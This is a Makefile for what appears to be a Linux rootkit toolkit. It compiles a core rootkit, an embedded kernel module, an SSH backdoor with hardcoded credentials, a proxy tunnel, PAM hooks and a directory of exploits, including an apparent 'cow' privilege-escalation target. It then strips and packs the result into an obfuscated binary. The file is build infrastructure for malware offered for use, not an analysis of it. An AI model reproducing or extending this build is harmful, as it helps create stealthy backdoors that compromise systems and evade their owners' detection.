ARCH=__AMD64__
ifeq ($(ARCH), __MIPS32__)
KFLAGS=-fomit-frame-pointer -G 0 -fpic -fvisibility=hidden -finhibit-size-directive
UFLAGS=-mno-abicalls
MFLAGS=-mips32
LDFLAGS=-static
endif
ifeq ($(ARCH), __AMD64__)
KFLAGS=-Bsymbolic -fvisibility=protected -fPIC -fno-omit-frame-pointer -mpreferred-stack-boundary=3 -mno-sse -maccumulate-outgoing-args -fno-optimize-sibling-calls -mno-red-zone
MODFLAGS=-m elf_x86_64
LDFLAGS=-static
UFLAGS=
endif
ifeq ($(ARCH), __IA32__)
KFLAGS=
LDFLAGS=-static -Ttext=0xdeadb40
MODFLAGS=-m elf_i386
UFLAGS=
endif
export KFLAGS
export MODFLAGS
export UFLAGS
CC=gcc
CFLAGS=-s -fno-builtin -nostdlib -nodefaultlibs
OBJ=rkcore/rkcore.o rkcore/rkopsig.o rkcore/rklib.o rkcore/rkdbg.o rkmod/rkmod.ko rkbin/*.o rklib/*.o sshbd/bd.o
all:
	@make tar
	@rm -rf build
	@mkdir build
	@tar -xvf rk.tar -C build/
	@cd rkmod && make
	@ld -r -b binary -o rkmod/rkmod.ko rkmod/rkmod.mod.o
	@objcopy --redefine-sym _binary_rkmod_rkmod_mod_o_size=_rkmod_size rkmod/rkmod.ko
	@objcopy --redefine-sym _binary_rkmod_rkmod_mod_o_start=_rkmod_start rkmod/rkmod.ko
	@cd rkexp  && make
	@cd rkbin  && make
	@cd sshbd  && make
	@cd rklib  && make
	@cd rkcore && make
	$(CC) $(LDFLAGS) $(CFLAGS) $(OBJ) -o rk
	@objcopy --remove-section=.comment rk
	./rkesx/build/mp_local_amd64 -o rsh -c ./rk
#	@cd libcrypt && make
#	@cp rk rkbin
#	@mv libcrypt/head ./rk

pack:
	@rm -rf libcrypt/midgetpack/build
	@cd libcrypt/midgetpack/build && cmake ..
	make

tar:
	@rm -f rk.tar
	@tar -cf rk.tar rkesx/ rkld/ configure Makefile include/*.h libcrypt/sodium libcrypt/*.c libcrypt/Makefile libcrypt/lib rkbin/Makefile rkbin/*.[ch] rkcore/Makefile rkcore/*.c rkexp/ rklib/Makefile rklib/*.c rkmod/*.c rkmod/Makefile rkmod/*.lds sshbd/*.[chs] sshbd/Makefile
#	@cd libcrypt && make tar
#	@mv libcrypt/head ./ex

LDSRC=../rkld/config.c ../rkld/rkld.c ../rkld/pam.c ../rkld/rkload.c ../rkld/rkmod.c ../rkld/util.h ../rkld/pam.h ../rkld/liblkm.c ../rkld/liblkm.h ../rkld/cpu.h ../rkld/Makefile ../rkld/pidwatch.c
RKV3_SRC=../rkcore/rkcore.c ../rkcore/rkopsig.c ../rkcore/rkdbg.c ../rkcore/Makefile ../rkcore/rklib.c ../rkbin/rk.c ../rkbin/ctrl.c ../rkbin/rkproxy/rkproxy.c ../rkbin/rkproxy/rkproxy_tunnel.c ../rkbin/rkproxy/rktunnel.h ../rkbin/rkproxy/libutil.c 
RKV3_INC=../include/arch.h ../include/cdefs.h ../include/conf.h ../include/defs.h ../include/elf.h ../include/kdefs.h ../include/libc.h ../include/libio.h ../include/mips.h ../include/opsig.h ../include/rkcore.h ../include/rklib.h ../include/rktrap.h ../include/syscalls64.h ../include/syscalls.h ../include/unistd.h ../include/x32.h ../include/x64.h ../include/x86.h
SSHBD_SRC=../sshbd/bd.c ../sshbd/bd.h ../sshbd/hardcoded.h ../sshbd/arch.h ../sshbd/sshbd32.s ../sshbd/sshbd64.s
KMOD_SRC=../rkmod/rkmod.c

cow:
	@cd rkexp/cow && make
	@cd libcrypt && make cowtar

clean:
	@rm -rf *~
	@rm -rf key*
	@rm -rf rk
	@cd rkbin  && make clean
	@cd sshbd  && make clean
	@cd rklib  && make clean
	@cd rkmod  && make clean
	@cd rkcore && make clean
	@cd libcrypt && make clean

